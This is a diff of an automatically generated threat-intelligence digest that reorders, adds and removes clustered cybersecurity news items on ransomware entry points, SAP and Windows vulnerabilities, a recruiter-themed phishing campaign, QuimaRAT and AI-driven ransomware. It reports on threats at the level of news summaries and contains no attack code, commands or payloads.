Webinar 15:00 — 16:00, 30 April 2026 1 How to Manage Enterprise Cyber Resilience in the Age of AI Webinar 11:00 — 12:00, 21 May 2026 2 Behind the Curtain of Microsoft 365 Cybersecurity: Lessons from Overlooked Resilience Gaps Webinar 15:00 — 16:00, 23 April 2026 3 How To Enhance Security Operations with AI-Powered Defenses Webinar 15:0
-```
-
-#### Corroborating sources (1)
-
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - Title: Progress Restores ShareFile Storage Zones Access After Vulnerability Exploit Concerns
-  - Published: 2026-07-15T12:00:00+00:00
-  - Link: https://www.infosecurity-magazine.com/news/progress-restores-sharefile/
-  - Summary: Progress has restored access to its ShareFile Storage Zones Controller after a four-day suspension triggered by a credible external security threat
 
 ### Cluster f8c7235a08 — score 10
 
@@ -2917,6 +2831,47 @@ In a recent episode of Intel 471's Happy Hunting series , we broke down Scattere
   - Published: 2026-07-14T16:15:00+00:00
   - Link: https://www.intel471.com/blog/threat-hunting-case-study-scattered-spider
   - Summary: Scattered Spider skips malware and breaks in with a phone call and a legitimate remote access tool, here's how to hunt for it.
+
+### Cluster 5b3297c4f5 — score 10
+
+- Title: Compromised Logins Surge as the Most Common Entry Point for Ransomware Attacks
+- Source: Infosecurity Magazine (cyber_news_breach_reporting)
+- Published: 2026-07-15T12:45:00+00:00
+- Link: https://www.infosecurity-magazine.com/news/compromised-logins-ransomware-entry/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: phishing_social_eng, ransomware_extortion
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Research of incidents by Sophos finds that phishing, brute force attacks and other identity-based threats have surpassed software vulnerabilities as means of delivering ransomware
+```
+
+#### Full body
+
+```
+Infosecurity Magazine Home » News » Compromised Logins Surge as the Most Common Entry Point for Ransomware Attacks Compromised Logins Surge as the Most Common Entry Point for Ransomware Attacks News 15 July 2026 Written by Danny Palmer Deputy Editor , Infosecurity Magazine Identity-based attacks and abuse of compromised credentials have become the most common method cybercriminals use to hit networks with ransomware, analysis of real-world incidents has revealed. According to a new report by Sophos, 79% of ransomware attacks can be traced back to an initial intrusion which exploited compromised identities and legitimate user logins. In total, malicious emails accounted for the initial entry point for ransomware in 26% of analyzed incidents, up from 19% in 2025. Phishing attacks , often used to steal legitimate login credentials, were the root cause of ransomware attacks in 24% of incidents, which is up from 18% during the previous year. The third most common entry point for ransomware incidents was brute force attacks , a method which sees cybercriminals use automation and trial and error to breach commonly used or weak passwords . This accounted for 23% of ransomware attacks, a slight drop from 22% during the previous year. Identity-based attacks have risen at the expense of vulnerabilities being exploited. Previously, the most common root cause of ransomware incidents, the percentage of attacks which started with attackers exploiting known security vulnerabilities dropped from 32% in 2025 to 18% in 2026. "Over the last 12 months across the ransomware landscape we’ve seen attackers rely on ‘easier’ attacks, using compromised identities as the primary initial access vector. Not to mention the developments in social engineering, with AI routinely deployed to polish phishing emails and sophisticated ClickFix campaigns designed to trick even the most trained users into bypassing MFA. This years trend shows they are focused on targeting humans," Ross McKerchar, CISO at Sophos told Infosecurity . Attackers are leveraging the exploited identities in several different ways, using them to access exposed applications or systems (38%), remote device logins (30%) and firewalls (21%) as well as exposed VPNs (8%) and in some cases, IoT devices as the initial point of entry (3%). There is not one factor that left organizations exposed to attacks, but there are some common trends. According to the 2158 cybersecurity leaders surveyed by Sophos, 62% cited security gaps in the network , both known and unknown as a potential reason for cyber-attacks going undetected. Over half (58%) said their organization was held back by resources around a lack of people or appropriate expertise to keep the organization safe from cyber threats. Meanwhile, 57% of respondents said that they felt that their organization had not implemented the correct level of cybersecurity solutions or protections to keep the network or users safe. Recovering From a Ransomware Attack For those organizations which fell victim to a ransomware attack to the extent data was encrypted, 48% said that they paid the ransom to get data back. In addition to this, 66% said they used their own backups to restore some of the encrypted data, up from 54% in 2025. When it came to ransom demands, the report said that the median ransom demand has fallen to $698,000 in this year’s report, down from $2m just two years ago. However, the large organizations continue to receive much higher ransom demand, amounting to millions of dollars. While it might look as if ransom payments are getting lower, what is really happening is that cybercriminals are tailoring their ransom demands to the organizations they hit, demanding less from smaller organizations. That’s simply because if they went in with a ransom demand that was too high, the organization would refuse to pay. However, if the ransom demand is more ‘reasonable’ it can push the victim to pay up for the decryption key, especially if they believe tha
+```
+
+#### Corroborating sources (1)
+
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - Title: Compromised Logins Surge as the Most Common Entry Point for Ransomware Attacks
+  - Published: 2026-07-15T12:45:00+00:00
+  - Link: https://www.infosecurity-magazine.com/news/compromised-logins-ransomware-entry/
+  - Summary: Research of incidents by Sophos finds that phishing, brute force attacks and other identity-based threats have surpassed software vulnerabilities as means of delivering ransomware
 
 ### Cluster 98dd5f4721 — score 10
 
@@ -3358,96 +3313,6 @@ ResearcherZero • July 11, 2026 4:18 AM De-funding public access to government 
   - Link: https://www.schneier.com/blog/archives/2026/07/friday-squid-blogging-squidbleed-vulnerability.html
   - Summary: In a rare combined cybersecurity/squid post, a twenty-nine-year-old squid proxy bug can leak HTTP requests. As usual, you can also use this squid post to talk about the security stories in the news that I haven’t covered. Blog moderation policy.
 
-### Cluster ae25d6203b — score 9
-
-- Title: SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-14T18:17:57+00:00
-- Link: https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: CVE-2026-44747
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, ddos
-- actor_attribution: Scattered Spider
-- affected_industries: financial_services
-- cve_ids: CVE-2026-27690, CVE-2026-44747, CVE-2026-44761
-- urgency_signals: actively_exploited, critical_cvss, preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ddos, active_exploitation
-- actor_attribution: Scattered Spider
-- affected_industries: financial_services
-- cve_ids: CVE-2026-44747, CVE-2026-27690, CVE-2026-44761
-- urgency_signals: actively_exploited, preauth_unauth, critical_cvss
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could
-```
-
-#### Full body
-
-```
-SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data  Ravie Lakshmanan  Jul 14, 2026 Enterprise Security / Vulnerability SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could lead to unauthorized data access, modification, or system unavailability. "As a temporary workaround the note proposes to disable all ICF nodes with a specific property in transaction SICF," SAP security firm Onapsis said . "Since the workaround will disable opening transactions in SAP GUI for HTML, it is not an option for all customers and it is strongly recommended to install the patching ABAP Kernel version." Also addressed by SAP are two other critical vulnerabilities - CVE-2026-27690 (CVSS score: 9.1) - An HTTP request/response smuggling flaw in SAP Approuter deployments in non-Cloud Foundry environments that allows an unauthenticated attacker to send a specially crafted HTTP request that leads to request-response desynchronization and results in the exposure of user responses and triggers denial-of-service (DoS) attacks. CVE-2026-44761 (CVSS score: 9.1) - A use of default credentials flaw in SAP Commerce Cloud that could retain a sample OAuth 2.0 client with publicly documented sample credentials originating from a sample configuration provided in SAP Help Portal documentation. "If left unchanged, an unauthenticated attacker could use these well-known credentials to obtain a valid access token and invoke certain APIs to read and modify data," according to a description of CVE-2026-44761 in the NIST National Vulnerability Database (NVD). "Successful exploitation results in high impact on confidentiality and integrity, with no impact on availability." Onapsis noted that the vulnerability stems from sample configuration scripts previously provided in the SAP Help Portal. These scripts, originally meant for development and testing, configure OAuth 2.0 clients with hard-coded, well-known credentials. "Older versions of the documentation did not explicitly warn customers against importing these default settings into production," it noted. "An unauthenticated attacker can leverage these publicly available, default credentials to obtain a valid access token. With this token, they can invoke specific APIs to read and alter system data. Exploitation requires that the customer executed the sample script and retained the resulting OAuth 2.0 client in production without replacing the hard-coded secret." It's worth noting that customers who removed the sample client or replaced the secret with a strong, unique value are not impacted by the bug. Customers are recommended to audit their production environments for the presence of the affected sample OAuth 2.0 client. If the client exists, it must be removed. Although there is no evidence of the flaws being exploited in the wild, it's advised to apply the necessary updates for optimal protection. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  API Security , Application Security , Authentication Security , Cloud security , data security , denial of service , enterprise security , SAP , Vulnerability , Web Security ⚡ Top Stories This Week 16-Year-Old Linux KVM Flaw Lets Guest VMs Escape to Host on Intel and AMD x86 Systems BeyondTrust Patches Critical Auth Bypass Flaws in Remote Support and PRA Court Filing Reveals Windows Device ID Helped FBI Trace Alleged Scattered Spider Hacker Rogue Agent Flaw Could Have Let Attackers Hijack Google Dialogflow CX Chatbots RedWing MaaS Packages Android Bank Fraud as a Telegram Rental Service 15-Year-O
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data
-  - Published: 2026-07-14T18:17:57+00:00
-  - Link: https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
-  - Summary: SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could
-
-### Cluster aad8380132 — score 9
-
-- Title: Smashing Security podcast #475: JadePuffer – the AI that ran a ransomware attack all by itself
-- Source: Graham Cluley (practitioner_analysis)
-- Published: 2026-07-08T23:19:18+00:00
-- Link: https://grahamcluley.com/smashing-security-podcast-475/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
-- content_type: incident_report
-- confidence_tier: tier_3_analysis
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion
-- content_type: incident_report
-- confidence_tier: tier_3_analysis
-
-#### Summary
-
-```
-A 15-year-old boy asked a chatbot for help - and cancelled nearly 47,000 anime streaming subscriptions in under four hours. Meanwhile, researchers have documented the first fully autonomous, agentic AI-driven ransomware attack, "JadePuffer". What does this tell us about the future of cybersecurity? Also, Apple's "Hide My Email" feature turns out to hide rather less than it promises - despite Apple knowing it has a problem for over a year. All this and more in this episode of the "Smashing Security" podcast with cybersecurity expert and keynote speaker Graham Cluley, and special guest Zoë Rose.
-```
-
-#### Full body
-
-```
-Graham Cluley @ 12:19 am, July 9, 2026 @grahamcluley.com / grahamcluley A 15-year-old boy asked a chatbot for help – and cancelled nearly 47,000 anime streaming subscriptions in under four hours. Meanwhile, researchers have documented the first fully autonomous, agentic AI-driven ransomware attack, “JadePuffer”. What does this tell us about the future of cybersecurity? Also, Apple’s “Hide My Email” feature turns out to hide rather less than it promises – despite Apple knowing it has a problem for over a year. All this and more in this episode of the “Smashing Security” podcast with cybersecurity expert and keynote speaker Graham Cluley, and special guest Zoë Rose. Smashing Security #475 JadePuffer - the AI that ran a ransomware attack all by itself ↺ 15 ↻ 30 0:00 Learn more 0:00 0:00 0:00 1× Show full transcript ▼ This transcript was generated automatically, probably contains mistakes, and has not been manually verified. ZOE ROSE We need an LLM that says, here's how to do it. And don't forget to consider these things. Unknown No, no, we don't need that actually, Zoe. We don't need any help for the criminals in covering up the tracks. Interesting. Interesting that you should suggest that. Smashing Security, episode 475. JadePuffer, the AI that ran a ransomware attack all by itself. With Graham Cluley and special guest Zoe Rose. Hello, hello, and welcome to Smashing Security episode 475. My name's Graham Cluley. ZOE ROSE And I'm Zoe Rose. GRAHAM CLULEY Hello, Zoe. Welcome back to the show. It's been a while since you've been on. How are you doing? ZOE ROSE Well, usually when I join, something massive has happened. GRAHAM CLULEY Right. ZOE ROSE At the moment, I have not acquired another child or a pet. GRAHAM CLULEY So, well done. ZOE ROSE Yeah. GRAHAM CLULEY So for those who don't know Zoe, what are you? I mean, people who haven't heard of you before, what do you do exactly? ZOE ROSE That's a good question. What do I do? I work in security and pretend I know what I'm talking about half the time. GRAHAM CLULEY Oh, okay. It seems fair enough. And you work for a big company? ZOE ROSE I have a bloody long title now, actually. That's the change. That's what's new. My title has massively increased. GRAHAM CLULEY Okay, give us your title. Let's hear it. ZOE ROSE All right. It is C-Cert, which if you know what that stands for, it has more words, but we'll just stick to some letters. Security Operations Development Manager. GRAHAM CLULEY Wow. ZOE ROSE Yeah. GRAHAM CLULEY Security Operations Development Manager, like SODOM, is basically what you're saying. Unknown Yeah, sure. GRAHAM CLULEY Interesting. Well, before we kick off, let's thank this week's wonderful sponsors, Arctic Wolf, NordLayer, and Vanta. We'll be hearing more about them later on in the podcast. This week on Smashing Security, we're not going to be talking about how a Greek politician investigating spyware had his own mobile phone hacked. You'll hear no discussion of how a US Department of Homeland Security information sharing database has been accessed by hackers. And we won't even mention how hackers are using a fake World Cup t-shirt offer to spread malware. So Zoe, what are you going to be talking about this week? ZOE ROSE I'm going to talk about Apple's Hide My Email isn't actually as hidden as it sounds like. GRAHAM CLULEY And I'm going to be telling the tale of how a 15-year-old with a chatbot became a cybercriminal and what happens when the AI just does the whole job itself. All this and much more coming up on this episode of Smashing Security. JOE Graham, am I right in thinking that Arctic Wolf are sponsoring the show this week? GRAHAM CLULEY You are right, Joe. They've just published a new report, 2026 State of the Cybersecurity Attack Surface, and they analysed over 800,000 real IT assets to find out how exposed organisations actually are. JOE And I'm guessing everything is hunky-dory. GRAHAM CLULEY No, not so much. The reality is they found 1 in 3 IT assets is
-```
-
-#### Corroborating sources (1)
-
-- **Graham Cluley** (practitioner_analysis)
-  - Title: Smashing Security podcast #475: JadePuffer – the AI that ran a ransomware attack all by itself
-  - Published: 2026-07-08T23:19:18+00:00
-  - Link: https://grahamcluley.com/smashing-security-podcast-475/
-  - Summary: A 15-year-old boy asked a chatbot for help - and cancelled nearly 47,000 anime streaming subscriptions in under four hours. Meanwhile, researchers have documented the first fully autonomous, agentic AI-driven ransomware attack, "JadePuffer". What does this tell us about the future of cybersecurity? Also, Apple's "Hide My Email" feature turns out to hide rather less than it promises - despite Apple knowing it has a problem for over a year. All this and more in this episode of the "Smashing Security" podcast with cybersecurity expert and keynote speaker Graham Cluley, and special guest Zoë Rose.
-
 ### Cluster 88d76f4fd8 — score 9
 
 - Title: Lessons Learned from CISA’s Recent GitHub Leak
@@ -3491,24 +3356,112 @@ The Cybersecurity and Infrastructure Security Agency (CISA) has issued a postmor
   - Link: https://krebsonsecurity.com/2026/07/lessons-learned-from-cisas-recent-github-leak/
   - Summary: The Cybersecurity and Infrastructure Security Agency (CISA) has issued a postmortem on a data leak in which a contractor published dozens of internal CISA credentials -- including AWS Govcloud keys -- in a public GitHub repository for almost six months before being notified by KrebsOnSecurity. Experts say the gaps identified in the agency's initial response provide important lessons that all security teams should absorb.
 
+### Cluster 3ab4666a65 — score 9
+
+- Title: Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-15T11:07:07+00:00
+- Link: https://thehackernews.com/2026/07/researcher-drops-new-windows-zero-day.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, zero_day
+- affected_industries: government
+- affected_products: Microsoft Defender, Microsoft SharePoint
+- cve_ids: CVE-2026-32201, CVE-2026-45659, CVE-2026-56155, CVE-2026-56164
+- urgency_signals: actively_exploited, poc_available, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day, active_exploitation
+- affected_industries: government
+- affected_products: Microsoft Defender, Microsoft SharePoint
+- cve_ids: CVE-2026-56164, CVE-2026-56155, CVE-2026-32201, CVE-2026-45659
+- urgency_signals: actively_exploited, zero_day, poc_available
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Security researcher Chaotic Eclipse (aka Nightmare-Eclipse) has released a new proof-of-concept (PoC) exploit called LegacyHive. It has been described as a Windows User Profile Service arbitrary hive load elevation of privileges vulnerability. The Windows User Profile Service, also referred to as ProfSvc, is a core system component that manages user accounts and environments. "The PoC requires
+```
+
+#### Full body
+
+```
+Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday  Ravie Lakshmanan  Jul 15, 2026 Vulnerability / Enterprise Security Security researcher Chaotic Eclipse (aka Nightmare-Eclipse ) has released a new proof-of-concept (PoC) exploit called LegacyHive. It has been described as a Windows User Profile Service arbitrary hive load elevation of privileges vulnerability. The Windows User Profile Service, also referred to as ProfSvc, is a core system component that manages user accounts and environments. "The PoC requires another standard user credential and a third username (which can be an administrator account)," Chaotic Eclipse said . "If the PoC is successful, it will end up mounting the target user hive in the current user classes root." The researcher said the exploit was stripped down to prevent public exploitation, adding the original exploit did not require additional user credentials and was not limited to the "usrclass.dat" hive. "Any hive could be loaded using this vulnerability, but you would need some brain cells to make the PoC do it," the researcher noted. What makes it notable is that it's functional on all supported desktop and server versions of Windows, including those running the latest July 2026 Patch Tuesday update. Chaotic Eclipse and Microsoft have been locked in a heated dispute since at least April 2026, with the researcher releasing details of multiple exploits before the Windows maker had a chance to patch them, citing a breakdown in communication. Three of the vulnerabilities in Microsoft Defender came under active exploitation shortly after public disclosure. Earlier this month, the tech giant released security updates for another Defender vulnerability known as RoguePlanet that was disclosed by the researcher. However, it emerged that the newly introduced "defense-in-depth updates" to address the flaw can cause Microsoft Defender to leak 8 bytes of data when attempting to open a file in certain scenarios. Microsoft told The Hacker News that it's investigating the new report. We have contacted the company for comment regarding LegacyHive, and we will update the story if we hear back. SharePoint Server Flaws in Spotlight The development comes as Microsoft shipped patches for a record 622 flaws , including two privilege escalation shortcomings in SharePoint Server (CVE-2026-56164, CVSS score: 5.3) and Active Directory Federation Services (CVE-2026-56155, CVSS score: 7.8) that have been flagged as actively exploited. The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added both vulnerabilities to its Known Exploited Vulnerabilities ( KEV ) catalog, which mandates that Federal Civilian Executive Branch (FCEB) agencies apply the fixes by July 17 and July 28, 2026, respectively. "After years of relative stability, the Patch Tuesday process has experienced significant turbulence so far in 2026," Adam Barnett, lead software engineer at Rapid7, said in a statement. "As well as the AI-fuelled exponential growth of vulnerability reporting and discovery, Microsoft is grappling with the emergence of a series of vulnerabilities disclosed in such a way as to bring maximum discomfort for Redmond." In a separate advisory, the agency said it's aware of active exploitation of multiple SharePoint Server flaws, including CVE-2026-32201 , CVE-2026-45659 , and CVE-2026-56164, that enable cyber threat actors to gain unauthorized access to susceptible instances. "These vulnerabilities affect all supported on-premises SharePoint Server versions (Subscription Edition, 2019, and 2016) and involve establishing remote code execution (RCE) and post-exploitation activities, such as stealing Internet Information Services (IIS) machine keys and performing deserialization techniques, to gain persistence and deploy malware," CISA said. "The flaw stems from missing authentication for a critical function, enabling an attacker to reach functionality that should require authorization," Alex Vovk, CE
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday
+  - Published: 2026-07-15T11:07:07+00:00
+  - Link: https://thehackernews.com/2026/07/researcher-drops-new-windows-zero-day.html
+  - Summary: Security researcher Chaotic Eclipse (aka Nightmare-Eclipse) has released a new proof-of-concept (PoC) exploit called LegacyHive. It has been described as a Windows User Profile Service arbitrary hive load elevation of privileges vulnerability. The Windows User Profile Service, also referred to as ProfSvc, is a core system component that manages user accounts and environments. "The PoC requires
+
+### Cluster ae25d6203b — score 9
+
+- Title: SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-14T18:17:57+00:00
+- Link: https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-44747
+
+#### Cluster taxonomy (union across members)
+- cve_ids: CVE-2026-44747
+- urgency_signals: critical_cvss
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- cve_ids: CVE-2026-44747
+- urgency_signals: critical_cvss
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data
+  - Published: 2026-07-14T18:17:57+00:00
+  - Link: https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
+  - Summary: SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP. The vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could
+
 ### Cluster b7474f0127 — score 9
 
 - Title: Operation Fake KickOff: Attackers Abuse Recruiters and SaaS to Harvest Work Credentials
 - Source: Intel 471 (ransomware_ecrime_financial_crime)
 - Published: 2026-07-15T18:00:00+00:00
 - Link: https://www.intel471.com/blog/operation-fake-kickoff-attackers-abuse-recruiters-and-saas-to-harvest-work-credentials
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, phishing_social_eng
+- threat_categories: credential_theft, mfa_bypass, phishing_social_eng
+- affected_products: Google Workspace, Salesforce
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
-- threat_categories: phishing_social_eng, credential_theft
+- threat_categories: phishing_social_eng, credential_theft, mfa_bypass
+- affected_products: Salesforce, Google Workspace
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
@@ -3518,6 +3471,12 @@ The Cybersecurity and Infrastructure Security Agency (CISA) has issued a postmor
 Intel 471 investigated an ongoing, multi-stage phishing operation that systematically abuses legitimate software-as-a-service (SaaS) sales and marketing, and cloud platforms to orchestrate corporate credential theft.
 ```
 
+#### Full body
+
+```
+Executive Summary Intel 471 investigated an ongoing, multi-stage phishing operation that systematically abuses legitimate software-as-a-service (SaaS) sales and marketing, and cloud platforms to orchestrate corporate credential theft. The campaign lures victims using deceptive, corporate-themed interview-scheduling interfaces, leveraging the identity of real recruiters linked to impersonated organizations to deploy an adversary-in-the-middle (AitM) toolkit designed to harvest corporate Google Workspace credentials, live session tokens in real time and bypass standard multi-factor authentication (MFA) mechanisms. Key Findings Extensive infrastructure pool : We identified 232 dedicated phishing domains, 80 command-and-control (C2) servers. Impersonation of human resources hiring firms : The campaign impersonated premier global brands across 15 distinct industry verticals. The most targeted industry was human resources consulting at about 54% of all observed phishing infrastructure, while two prominent global agencies, Robert Half Inc. and Aquent LLC, continuously were impersonated and accounted for about 50% of all observed domains, based on adversaries’ assessed intentions. Opportunistic campaign waves: The initial campaigns started in April 2025 and have continuously adapted. Most recently, the adversaries rotated their infrastructure to capitalize on the public visibility of the FIFA World Cup 2026 to lure targets, with insights of this campaign wave being recently reported in open source. The operation continues to successfully deploy live phishing pages and harvest corporate access at the time of this report. Delivery mechanisms: The adversaries weaponized legitimate marketing and email-delivery platforms such as Salesforce, SendGrid, and Zoho to distribute email lures leading victims to the phishing landing pages. Social engineering: Victims were forwarded to landing pages tailored to mimic a standard Calendly interview interface, using the identity of real recruiters associated with impersonated organizations. AitM toolkit : Adversaries deployed an AitM toolkit possibly developed with support of AI. A dedicated script applies the browser-in-the-box (BitB) technique to create a visually identical Google sign-in replica page. The toolkit also had four scripts dedicated to harvest MFA authentication codes delivered via email, short message service (SMS), the Google Authenticator app and Google prompt notification. Corporate emails only : Victims’ emails were verified with a hardcoded list that blocked standard providers. The assessed intention is that only corporate emails were targeted. Data exfiltration: Stolen credentials were forwarded to C2 servers on Render cloud hosting infrastructure and then to Telegram bots. Intelligence cutoff date (ICOD) : July 7, 2026 FIFA-themed phishing page reveals operation to harvest corporate account credentials Our investigation began with the analysis of the fifahr-careers.com phishing domain. Visitors to the site were met with a deceptive Calendly interview-scheduling interface that prompted them to log into a fake Google Calendar using a business account. When victims clicked "Continue with Google," instead of launching a secure Open Authorization (OAuth) pop-up window, the page redirected the user to a fabricated Google login screen within the current tab. To maximize credibility, adversaries leveraged the actual names and profile pictures of real recruiters from FIFA’s talent acquisition team. While not confirmed, adversaries possibly obtained this information from public accessible profiles on the Linkedin social media platform. Our investigation of Operation Fake KickOff revealed that the campaign did not solely impersonate FIFA, but instead expanded to target dozens of other organizations in an operation that has been active since April 2025. Figure 1: The image depicts the fifahr-careers.com phishing page illustrating a schedule call designed to harvest corporate account credenti
+```
+
 #### Corroborating sources (1)
 
 - **Intel 471** (ransomware_ecrime_financial_crime)
@@ -3525,39 +3484,6 @@ Intel 471 investigated an ongoing, multi-stage phishing operation that systemati
   - Published: 2026-07-15T18:00:00+00:00
   - Link: https://www.intel471.com/blog/operation-fake-kickoff-attackers-abuse-recruiters-and-saas-to-harvest-work-credentials
   - Summary: Intel 471 investigated an ongoing, multi-stage phishing operation that systematically abuses legitimate software-as-a-service (SaaS) sales and marketing, and cloud platforms to orchestrate corporate credential theft.
-
-### Cluster d26d1e1075 — score 9
-
-- Title: Emerging Threat: QuimaRAT
-- Source: Intel 471 (ransomware_ecrime_financial_crime)
-- Published: 2026-07-15T11:00:00+00:00
-- Link: https://www.intel471.com/blog/emerging-threat-quimarat
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-QuimaRAT is a newly identified Java-based Remote Access Trojan (RAT) that is being marketed under a Malware-as-a-Service (MaaS) model, and providing threat actors with a cross-platform remote access framework capable of targeting Windows, Linux, and macOS systems.
-```
-
-#### Corroborating sources (1)
-
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - Title: Emerging Threat: QuimaRAT
-  - Published: 2026-07-15T11:00:00+00:00
-  - Link: https://www.intel471.com/blog/emerging-threat-quimarat
-  - Summary: QuimaRAT is a newly identified Java-based Remote Access Trojan (RAT) that is being marketed under a Malware-as-a-Service (MaaS) model, and providing threat actors with a cross-platform remote access framework capable of targeting Windows, Linux, and macOS systems.
 
 ### Cluster 8ca1179b44 — score 9
 
@@ -4045,6 +3971,39 @@ Security firm Coinspect has disclosed a crypto wallet flaw it calls Ill Bloom, a
   - Published: 2026-07-10T09:00:05+00:00
   - Link: https://thehackernews.com/2026/07/attackers-exploit-ill-bloom.html
   - Summary: Security firm Coinspect has disclosed a crypto wallet flaw it calls Ill Bloom, and attackers are already using it. The flaw is in how some wallet software generated its recovery phrase, the words that control the money. When that phrase is made with weak randomness, an attacker can work it out and take everything it controls. The firm has confirmed one coordinated sweep on May 27
+
+### Cluster d26d1e1075 — score 8
+
+- Title: Emerging Threat: QuimaRAT
+- Source: Intel 471 (ransomware_ecrime_financial_crime)
+- Published: 2026-07-15T11:00:00+00:00
+- Link: https://www.intel471.com/blog/emerging-threat-quimarat
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+QuimaRAT is a newly identified Java-based Remote Access Trojan (RAT) that is being marketed under a Malware-as-a-Service (MaaS) model, and providing threat actors with a cross-platform remote access framework capable of targeting Windows, Linux, and macOS systems.
+```
+
+#### Corroborating sources (1)
+
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - Title: Emerging Threat: QuimaRAT
+  - Published: 2026-07-15T11:00:00+00:00
+  - Link: https://www.intel471.com/blog/emerging-threat-quimarat
+  - Summary: QuimaRAT is a newly identified Java-based Remote Access Trojan (RAT) that is being marketed under a Malware-as-a-Service (MaaS) model, and providing threat actors with a cross-platform remote access framework capable of targeting Windows, Linux, and macOS systems.
 
 ### Cluster 480db84242 — score 8
 
